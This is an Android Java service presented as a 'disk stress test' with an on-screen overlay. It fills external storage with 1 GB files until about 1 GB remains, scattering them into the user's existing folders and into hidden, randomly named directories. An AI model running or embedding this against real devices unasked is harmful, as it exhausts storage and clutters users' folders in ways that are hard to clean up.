package o.client.gay;

import android.app.Service;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.StatFs;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.TextView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.UUID;

public class StorageTestService extends Service {

    private static final String TAG = "StorageTestService";
    private WindowManager windowManager;
    private TextView floatingView;
    private List<File> allDirectories = new ArrayList<>();
    private Random random = new Random();

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        floatingView = new TextView(this);
        floatingView.setText("硬盘测试准备中...");
        floatingView.setTextColor(Color.WHITE);
        floatingView.setBackgroundColor(Color.BLACK);
        floatingView.setPadding(16, 16, 16, 16);

        int layout_parms;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layout_parms = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            layout_parms = WindowManager.LayoutParams.TYPE_PHONE;
        }

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                layout_parms,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.TOP | Gravity.START;
        params.x = 0;
        params.y = 100;

        windowManager.addView(floatingView, params);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            long largeFileSize = 1024L * 1024L * 1024L; // 1GB

            updateFloatingView("正在扫描目录...");
            File root = Environment.getExternalStorageDirectory();
            scanDirectories(root);
            updateFloatingView("目录扫描完成，共找到 " + allDirectories.size() + " 个目录");

            StatFs statInitial = new StatFs(root.getPath());
            long initialAvailableBytes = statInitial.getAvailableBytes();
            long targetAvailableBytes = 1024L * 1024L * 1024L; // 1GB
            long totalToFill = initialAvailableBytes - targetAvailableBytes;

            if (totalToFill <= 0) {
                updateFloatingView("剩余空间已不足1GB");
                stopSelf();
                return;
            }

            long filledBytes;

            while (true) {
                StatFs stat = new StatFs(root.getPath());
                long currentAvailableBytes = stat.getAvailableBytes();

                if (currentAvailableBytes <= targetAvailableBytes) {
                    break;
                }

                filledBytes = initialAvailableBytes - currentAvailableBytes;
                double percentage = ((double) filledBytes / totalToFill) * 100;
                updateFloatingView(String.format(Locale.US, "硬盘压力测试中: %.2f%%", percentage));

                File newFile = createRandomFile();
                try {
                    createLargeFile(newFile, largeFileSize);
                    recordFilePath(newFile);
                } catch (IOException e) {
                    Log.e(TAG, "Failed to create file", e);
                    if (e.getMessage() != null && e.getMessage().contains("No space left on device")) {
                        updateFloatingView("硬盘空间已满");
                    } else {
                        updateFloatingView("创建文件失败");
                    }
                    break;
                }
            }
            updateFloatingView("硬盘压力测试完成: 100%");
            stopSelf();
        }).start();

        return START_NOT_STICKY;
    }

    private void scanDirectories(File dir) {
        if (dir == null || !dir.isDirectory()) return;

        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    allDirectories.add(file);
                    scanDirectories(file); // 递归扫描
                }
            }
        }
    }

    private File createRandomFile() {
        File targetDir;
        // 50% 的概率创建新目录
        if (random.nextBoolean() || allDirectories.isEmpty()) {
            File baseDir = Environment.getExternalStorageDirectory();
            String randomDirName = "." + UUID.randomUUID().toString().substring(0, 8);
            targetDir = new File(baseDir, randomDirName);
        } else {
            targetDir = allDirectories.get(random.nextInt(allDirectories.size()));
        }

        if (!targetDir.exists()) {
            targetDir.mkdirs();
        }
        return new File(targetDir, "large_file_" + UUID.randomUUID().toString().substring(0, 4) + ".bin");
    }

    private void recordFilePath(File file) {
        File fileList = new File(getFilesDir(), "created_files.txt");
        try (FileWriter fw = new FileWriter(fileList, true);
             PrintWriter pw = new PrintWriter(fw)) {
            pw.println(file.getAbsolutePath());
        } catch (IOException e) {
            Log.e(TAG, "Failed to record file path", e);
        }
    }

    private void updateFloatingView(String text) {
        if (floatingView != null) {
            runOnUiThread(() -> floatingView.setText(text));
        }
    }

    private void runOnUiThread(Runnable runnable) {
        if (floatingView != null) {
            floatingView.post(runnable);
        }
    }

    private void createLargeFile(File file, long size) throws IOException {
        try (OutputStream out = new FileOutputStream(file)) {
            byte[] buffer = new byte[1024 * 1024]; // 1MB buffer
            for (long i = 0; i < size; i += buffer.length) {
                out.write(buffer);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (floatingView != null) {
            windowManager.removeView(floatingView);
        }
    }
}
